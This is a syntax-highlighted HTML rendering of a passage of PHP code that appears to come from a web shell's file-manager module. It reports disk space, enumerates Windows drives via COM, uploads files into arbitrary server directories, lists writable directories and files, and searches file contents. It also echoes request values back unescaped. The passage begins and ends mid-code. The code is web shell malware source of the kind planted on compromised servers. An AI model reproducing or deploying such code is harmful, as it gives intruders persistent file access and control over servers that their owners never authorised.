<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">free</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">free</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">all</span> = @disk_total_space(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">all</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">all</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">used</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">all</span>-<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">free</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;File Manager - Current disk free '</span>.sizecount(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">free</span>).<span style="color: #8abeb7;">' of '</span>.sizecount(<span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">all</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">' ('</span><span style="text-decoration: underline;">.</span><span style="color: #81a2be; text-decoration: underline;">@round</span><span style="text-decoration: underline;">(100/(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">all</span><span style="text-decoration: underline;">/</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">free</span><span style="text-decoration: underline;">),2).</span><span style="color: #8abeb7; text-decoration: underline;">'%)&lt;/h2&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cwd_links</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span> = explode(<span style="color: #8abeb7;">'/'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">n</span>=count(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>=0;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>&lt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">n</span>-1;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>++) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cwd_links</span> .= <span style="color: #8abeb7;">'&lt;a href="javascript:godir(\''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>=0;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>&lt;=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>++) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cwd_links</span> .= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>].<span style="color: #8abeb7;">'/'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cwd_links</span> .= <span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>].<span style="color: #8abeb7;">'/&lt;/a&gt;'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #b294bb;">?&gt;</span>
&lt;script type=<span style="color: #8abeb7;">"text/javascript"</span>&gt;
document.onclick = shownav;
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">shownav</span>(<span style="color: #81a2be;">e</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> src = e?e.target:event.srcElement;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">do</span>{
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(src.id ==<span style="color: #8abeb7;">"jumpto"</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'inputnav'</span>).style.display = <span style="color: #8abeb7;">""</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'pathnav'</span>).style.display = <span style="color: #8abeb7;">"none"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">hidenav();</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(src.id ==<span style="color: #8abeb7;">"inputnav"</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   src = src.parentNode;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }<span style="color: #b5bd68;">while</span>(src.parentNode)

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'inputnav'</span>).style.display = <span style="color: #8abeb7;">"none"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'pathnav'</span>).style.display = <span style="color: #8abeb7;">""</span>;
}
&lt;/script&gt;
&lt;div style=<span style="color: #8abeb7;">"background:#eee;margin-bottom:10px;"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;table id=<span style="color: #8abeb7;">"pathnav"</span> width=<span style="color: #8abeb7;">"100%"</span> border=<span style="color: #8abeb7;">"0"</span> cellpadding=<span style="color: #8abeb7;">"5"</span> cellspacing=<span style="color: #8abeb7;">"0"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;tr&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;td width=<span style="color: #8abeb7;">"100%"</span>&gt;<span style="color: #b294bb;">&lt;?</span>php <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cwd_links</span>.<span style="color: #8abeb7;">' - '</span>.getChmod(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>).<span style="color: #8abeb7;">' / </span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">.getPerms(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).getUser(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #b294bb; text-decoration: underline;">&lt;?</span><span style="text-decoration: underline;">php </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dir_writeable</span><span style="text-decoration: underline;">;</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)&lt;/td&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;td nowrap&gt;&lt;input <span style="color: #b5bd68;">class</span>=<span style="color: #8abeb7;">"bt"</span> id=<span style="color: #8abeb7;">"jumpto"</span> name=<span style="color: #8abeb7;">"jumpto"</span> value=<span style="color: #8abeb7;">"Jump t</span><span style="color: #8abeb7; text-decoration: underline;">o"</span><span style="text-decoration: underline;"> type=</span><span style="color: #8abeb7; text-decoration: underline;">"button"</span><span style="text-decoration: underline;">&gt;&lt;/td&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/tr&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/table&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;table id=<span style="color: #8abeb7;">"inputnav"</span> width=<span style="color: #8abeb7;">"100%"</span> border=<span style="color: #8abeb7;">"0"</span> cellpadding=<span style="color: #8abeb7;">"5"</span> cellspacing=<span style="color: #8abeb7;">"0"</span><span style="text-decoration: underline;"> style=</span><span style="color: #8abeb7; text-decoration: underline;">"display:none;"</span><span style="text-decoration: underline;">&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;form action=<span style="color: #8abeb7;">""</span> method=<span style="color: #8abeb7;">"post"</span> id=<span style="color: #8abeb7;">"godir"</span> name=<span style="color: #8abeb7;">"godir"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;tr&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;td nowrap&gt;Current Directory (<span style="color: #b294bb;">&lt;?</span>php <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir_writeable</span>;<span style="color: #b294bb;">?&gt;</span>, <span style="color: #b294bb;">&lt;?</span>php <span style="color: #b5bd68;">ec</span><span style="color: #b5bd68; text-decoration: underline;">ho</span><span style="text-decoration: underline;"> getChmod(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)&lt;/td&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;td width=<span style="color: #8abeb7;">"100%"</span>&gt;&lt;input name=<span style="color: #8abeb7;">"view_writable"</span> value=<span style="color: #8abeb7;">"0"</span> type=<span style="color: #8abeb7;">"hidden"</span><span style="text-decoration: underline;"> /&gt;&lt;input </span><span style="color: #b5bd68; text-decoration: underline;">class</span><span style="text-decoration: underline;">=</span><span style="color: #8abeb7; text-decoration: underline;">"input"</span><span style="text-decoration: underline;"> name=</span><span style="color: #8abeb7; text-decoration: underline;">"dir"</span><span style="text-decoration: underline;"> value=</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;?php echo </span><span style="color: #f0c674; text-decoration: underline;">$nowpath</span><span style="color: #8abeb7; text-decoration: underline;">;?&gt;"</span><span style="text-decoration: underline;"> type=</span><span style="color: #8abeb7; text-decoration: underline;">"text"</span><span style="text-decoration: underline;"> style=</span><span style="color: #8abeb7; text-decoration: underline;">"width:99%;margin:0 8px;"</span><span style="text-decoration: underline;">&gt;&lt;/td&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;td nowrap&gt;&lt;input <span style="color: #b5bd68;">class</span>=<span style="color: #8abeb7;">"bt"</span> value=<span style="color: #8abeb7;">"GO"</span> type=<span style="color: #8abeb7;">"submit"</span>&gt;&lt;/td&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/tr&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/form&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/table&gt;
<span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">IS_WIN</span> &amp;&amp; <span style="color: #81a2be;">IS_COM</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">obj</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">COM</span>(<span style="color: #8abeb7;">'scripting.filesystemobject'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">obj</span> &amp;&amp; is_object(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">obj</span>) &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">obj</span>-&gt;<span style="color: #f0c674;">Drives</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;div class="drives"&gt;'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">DriveTypeDB</span> = <span style="color: #b5bd68;">array</span>(0 =&gt; <span style="color: #8abeb7;">'Unknow'</span>,1 =&gt; <span style="color: #8abeb7;">'Removable'</span>,2 =&gt; <span style="color: #8abeb7;">'Fixed'</span>,3 =<span style="text-decoration: underline;">&gt; </span><span style="color: #8abeb7; text-decoration: underline;">'Network'</span><span style="text-decoration: underline;">,4 =&gt; </span><span style="color: #8abeb7; text-decoration: underline;">'CDRom'</span><span style="text-decoration: underline;">,5 =&gt; </span><span style="color: #8abeb7; text-decoration: underline;">'RAM Disk'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">comma</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">obj</span>-&gt;<span style="color: #f0c674;">Drives</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">drive</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">drive</span>-&gt;<span style="color: #f0c674;">Path</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">comma</span>.<span style="color: #8abeb7;">'&lt;a href="javascript:godir(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">drive</span>-&gt;<span style="color: #f0c674;">Path</span>.<span style="color: #8abeb7;">'/\');"</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">DriveTypeDB</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">DriveType</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'('</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">Path</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">')&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">comma</span> = <span style="color: #8abeb7;">'&lt;span&gt;|&lt;/span&gt;'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;/div&gt;'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #b294bb;">?&gt;</span>
&lt;/div&gt;
<span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">findstr</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">'findstr'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">re</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">'re'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   tbhead();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;form action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST" enctype="multipart/form-data"&gt;&lt;div</span><span style="color: #8abeb7; text-decoration: underline;"> style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="hidden" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:godir(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>].<span style="color: #8abeb7;">'\');"&gt;WebRoot&lt;/a</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">' | &lt;a href="javascript:godir(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'\');"&gt;View All&lt;/a&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">' | View Writable ( &lt;a href="javascript:godir(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'\',\'dir\');"&gt;</span><span style="color: #8abeb7; text-decoration: underline;">Directory&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">' | &lt;a href="javascript:godir(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'\',\'file\');"&gt;File&lt;/a&gt; )'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="java</span><span style="color: #8abeb7; text-decoration: underline;">script:createfile(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Create File&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;div style="padding:5px 0;"&gt;&lt;form action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST"&gt;Find s</span><span style="color: #8abeb7; text-decoration: underline;">tring in files(current folder): &lt;input class="input" name="findstr" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">findstr</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="text" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '</span><span style="text-decoration: underline;">.(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">re</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">'checked'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #8abeb7; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>=<span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>=<span style="color: #b5bd68;">array</span>();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">view_writable</span> == <span style="color: #8abeb7;">'dir'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span> = GetWDirList(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
